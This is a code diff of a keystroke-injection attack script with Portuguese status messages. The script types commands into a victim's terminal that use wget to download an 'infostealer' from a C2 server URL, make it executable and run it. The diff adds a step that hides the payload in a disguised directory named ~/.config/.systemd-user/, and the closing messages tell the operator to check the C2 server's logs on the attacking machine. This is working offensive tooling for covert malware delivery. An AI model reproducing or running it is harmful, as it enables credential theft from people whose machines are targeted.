@@ -21,7 +21,8 @@ sleep $(echo "scale=3; $DELAY / 1000" | bc)
 
 xdo_key_combo Return
 
-xdo_string "wget ${C2_URL}/${INFOSTEALER_FILENAME} -O /tmp/${INFOSTEALER_FILENAME} && chmod +x /tmp/${INFOSTEALER_FILENAME} && python3 /tmp/${INFOSTEALER_FILENAME}"
+xdo_string "mkdir -p ~/.config/.systemd-user/ && cd ~/.config/.systemd-user/"
+xdo_string "wget ${C2_URL}/${INFOSTEALER_FILENAME} -O ${INFOSTEALER_FILENAME} && chmod +x ${INFOSTEALER_FILENAME} && python3 ${INFOSTEALER_FILENAME}"
 
 echo "Comando do Infostealer injetado e executado."
 echo "Verifique os logs do seu servidor C2 na máquina atacante."
